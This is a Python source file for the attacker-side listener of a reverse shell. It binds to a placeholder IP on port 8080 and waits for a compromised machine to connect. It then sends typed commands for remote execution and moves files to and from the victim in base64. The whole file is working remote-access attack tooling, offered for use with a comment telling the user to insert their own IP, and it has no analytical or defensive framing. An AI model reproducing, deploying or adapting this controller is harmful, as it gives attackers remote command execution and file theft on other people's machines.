import base64
import socket
import json
import base64
import simplejson

class SocketListener:
    def __init__(self,ip,port):

        #ip = "#" 
        #port = 8080

        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))

        listener.listen(0)
        print("Listening..")

        (self.connection, address) = listener.accept()
        print("Connection successfully created from " + str(address))

    def json_send(self,data):
        json_data = simplejson.dumps(data)
        self.connection.send(json_data.encode("utf-8"))

    def json_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue


    def command_execution(self,command_input):
        self.json_send(command_input)
        if command_input[0] == "exit":
            self.connection.close()
            print("\nExit succesfully !")
            exit()


        return self.json_receive()


    def download_file(self,path,content):
        with open(path,"wb") as my_file:
            my_file.write(base64.b64decode(content))
            return "Download successfully"

    def upload_file(self,path):
        with open(path,"rb") as my_file:
            return base64.b64encode(my_file.read())

    def start_listener(self):
        while True:
            command_input =input("\nEnter command: ")
            command_input = command_input.split(" ")
            try:
                if command_input[0] == "upload":
                    my_file_content = self.upload_file(command_input[1])
                    command_input.append(my_file_content)
                command_output = self.command_execution(command_input)

                if command_input[0] == "download" and "Error" not in command_output:
                    command_output = self.download_file(command_input[1],command_output)
            except Exception:
                command_output = "Error"
            print(command_output)


socket_listener = SocketListener("#",8080) #write your ip addr
socket_listener.start_listener()

